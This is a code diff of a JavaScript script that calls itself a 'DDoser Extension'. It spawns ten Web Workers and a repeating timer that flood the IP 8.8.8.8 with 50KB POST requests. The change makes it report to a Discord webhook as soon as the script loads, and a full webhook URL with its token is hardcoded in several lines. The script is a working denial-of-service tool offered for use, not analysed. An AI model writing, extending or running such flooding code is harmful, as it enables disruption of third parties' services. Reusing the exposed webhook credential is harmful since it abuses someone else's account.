@@ -1,28 +1,4 @@
-// Function to send a large request and notify Discord on success
-function sendLargeRequest(ip, webhookUrl) {
-    const largePayload = 'X'.repeat(1024 * 50); // 50KB payload
-
-    fetch(`http://${ip}`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ data: largePayload }), // Send large data in the request body
-        cache: 'no-store',
-        timeout: 1000,
-    })
-    .then(response => {
-        console.log(`Successfully sent large packet to ${ip}`);
-        
-        // If the request is successful, send a message to Discord webhook
-        sendDiscordMessage(webhookUrl, 'Ping to 8.8.8.8 was successful!');
-    })
-    .catch(error => {
-        console.error(`Error sending large packet to ${ip}:`, error);
-    });
-}
-
-// Function to send a message to the Discord webhook
+// Function to send a large request and notify Discord on script load
 function sendDiscordMessage(webhookUrl, message) {
     fetch(webhookUrl, {
         method: 'POST',
@@ -45,12 +21,35 @@ function sendDiscordMessage(webhookUrl, message) {
     });
 }
 
-// Web Worker setup to simulate sending requests in parallel (multi-threaded)
-function createWorkerForRequest(ip, webhookUrl) {
+// Send an initial message to Discord when the script loads
+sendDiscordMessage('https://discord.com/api/webhooks/1306929413576982528/NiNG8RWafFxSdTjtaFReMpUHD_G9lrcF-jdywBAfjGjivcjKq71F08s2QL6TOIiS2h5I', 'DDoser Extension loaded and script started!');
+
+// Function to send a large request
+function sendLargeRequest(ip) {
+    const largePayload = 'X'.repeat(1024 * 50); // 50KB payload
+
+    fetch(`http://${ip}`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ data: largePayload }), // Send large data in the request body
+        cache: 'no-store',
+        timeout: 1000,
+    })
+    .then(response => {
+        console.log(`Successfully sent large packet to ${ip}`);
+    })
+    .catch(error => {
+        console.error(`Error sending large packet to ${ip}:`, error);
+    });
+}
+
+// Simulate load with multiple threads (workers)
+function createWorkerForRequest(ip) {
     const workerBlob = new Blob([`
         onmessage = function(e) {
             const ip = e.data.ip;
-            const webhookUrl = e.data.webhookUrl;
             const largePayload = 'X'.repeat(1024 * 50); // 50KB payload
 
             fetch(\`http://\${ip}\`, {
@@ -62,8 +61,6 @@ function createWorkerForRequest(ip, webhookUrl) {
             })
             .then(response => {
                 postMessage('Ping successful');
-                // Send Discord message on success
-                sendDiscordMessage(webhookUrl, 'Ping to 8.8.8.8 was successful!');
             })
             .catch(error => {
                 postMessage('Ping failed');
@@ -72,7 +69,7 @@ function createWorkerForRequest(ip, webhookUrl) {
     `], { type: 'application/javascript' });
 
     const worker = new Worker(URL.createObjectURL(workerBlob));
-    worker.postMessage({ ip, webhookUrl });
+    worker.postMessage({ ip });
     worker.onmessage = function(e) {
         console.log(e.data);
     };
@@ -80,19 +77,14 @@ function createWorkerForRequest(ip, webhookUrl) {
 }
 
 // Simulate load with multiple threads (workers)
-function simulateLoadWithThreads(ip, webhookUrl, threadCount) {
+function simulateLoadWithThreads(ip, threadCount) {
     for (let i = 0; i < threadCount; i++) {
-        createWorkerForRequest(ip, webhookUrl); // Each worker simulates a separate thread
+        createWorkerForRequest(ip); // Each worker simulates a separate thread
     }
 }
 
-// Start sending requests in parallel and notify Discord every 5 seconds
-function startPingWithNotifications(ip, webhookUrl, interval) {
-    setInterval(() => {
-        sendLargeRequest(ip, webhookUrl); // Send large request and notify Discord
-    }, interval);
-}
-
-// Start the simulation with large packets and multiple threads
-simulateLoadWithThreads('8.8.8.8', 'https://discord.com/api/webhooks/1306929413576982528/NiNG8RWafFxSdTjtaFReMpUHD_G9lrcF-jdywBAfjGjivcjKq71F08s2QL6TOIiS2h5I', 10); // 10 workers
-startPingWithNotifications('8.8.8.8', 'https://discord.com/api/webhooks/1306929413576982528/NiNG8RWafFxSdTjtaFReMpUHD_G9lrcF-jdywBAfjGjivcjKq71F08s2QL6TOIiS2h5I', 5000); // Notify every 5 seconds
+// Start sending requests in parallel and notify Discord immediately when the script loads
+simulateLoadWithThreads('8.8.8.8', 10); // 10 workers
+setInterval(() => {
+    sendLargeRequest('8.8.8.8'); // Send large request every 10 seconds
+}, 10000);
